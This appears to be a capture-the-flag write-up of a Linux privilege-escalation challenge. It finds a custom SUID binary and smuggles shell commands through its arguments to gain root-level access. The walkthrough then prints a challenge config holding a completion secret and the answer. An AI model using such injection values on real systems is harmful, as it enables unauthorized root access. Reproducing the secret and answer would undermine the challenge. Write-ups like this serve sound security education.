# Objective 7: Linux PrivEsc
**Location: Island of Misfit Toys: Ostrich Saloon**  
**Hints provided by Rose Mold**

The objective is to perform a privilege escalation in a Linux terminal session. Finally the binary residing in `/root` has to be executed.
The first approach is to find `suid` files on the file system:
```
elf@745490537a8a:~$ find / -perm -4000 -ls 2>/dev/null
1312417 84 -rwsr-xr-x 1 root root 85064 Nov 29 2022 /usr/bin/chfn
1312423 52 -rwsr-xr-x 1 root root 53040 Nov 29 2022 /usr/bin/chsh
1312541 56 -rwsr-xr-x 1 root root 55528 May 30 2023 /usr/bin/mount
1312546 44 -rwsr-xr-x 1 root root 44784 Nov 29 2022 /usr/bin/newgrp
1312620 68 -rwsr-xr-x 1 root root 67816 May 30 2023 /usr/bin/su
1312484 88 -rwsr-xr-x 1 root root 88464 Nov 29 2022 /usr/bin/gpasswd
1312645 40 -rwsr-xr-x 1 root root 39144 May 30 2023 /usr/bin/umount
1312557 68 -rwsr-xr-x 1 root root 68208 Nov 29 2022 /usr/bin/passwd
1457015 20 -rwsr-xr-x 1 root root 16952 Dec 2 22:17 /usr/bin/simplecopy
```

`simplecopy` looks promising as this does usually not exist on Linux systems (and has a recent last modified date).

Invoking this binary with some test arguments shows interesting error messages and reveals the name of the binary in `/root`:
```
elf@745490537a8a:~$ simplecopy "; ls -l /root" b
cp: missing file operand
Try 'cp --help' for more information.
ls: cannot access 'b': No such file or directory
/root:
total 600
-rws------ 1 root root 612560 Nov 9 21:29 runmetoanswer
```

So it seems that it is possible to inject shell commands in the arguments. We use this to add read and execute permissions to `/root` and `/root/runmetoanswer`:
```
elf@745490537a8a:~$ simplecopy "a; chmod -R a+rx /root" b
cp: missing destination file operand after 'a'
Try 'cp --help' for more information.
chmod: cannot access 'b': No such file or directory
elf@745490537a8a:~$ ls -l /root
total 600
-rwsr-xr-x 1 root root 612560 Nov 9 21:29 runmetoanswer
elf@745490537a8a:~$ /root/runmetoanswer
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```


**Achievement: Linux PrivEsc**

### Alternative

As it is also possible to provide the answer to the executable on the commandline, it is possible to complete this objective with just one command (even without knowing the executable name):

```
elf@d2e00edba597:~$ simplecopy "; /root/*" santa
cp: missing file operand
Try 'cp --help' for more information.
Your answer: santa

Checking....
Your answer is correct!
```

The correct answer was placed in `/etc/runtoanswer.yaml`:
```
elf@958d5b4a0e93:/etc$ simplecopy '; cat /etc/runtoanswer.yaml' b
cp: missing file operand
Try 'cp --help' for more information.
# This is the config file for runtoanswer, where you can set up your challenge!
---

# This is the completionSecret from the Content sheet - don't tell the user this!
key: b08b538569e395f88e12ef9fe751ac39

# The answer that the user is expected to enter - case sensitive
# (This is optional - if you don't have an answer, then running this will immediately win)
answer: "santa"

text: |
  Who delivers Christmas presents?

success_message: "Your answer is *correct*!"
failure_message: "Sorry, that answer is *incorrect*. Please try again!"
[...]
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTU3NzIyNjA4MywtMTkyMTE2MjUxMCwtMT
c2NjU1MTYyMCwtODI2MTc4Njg0LC0yMDEwMTkyNjNdfQ==
-->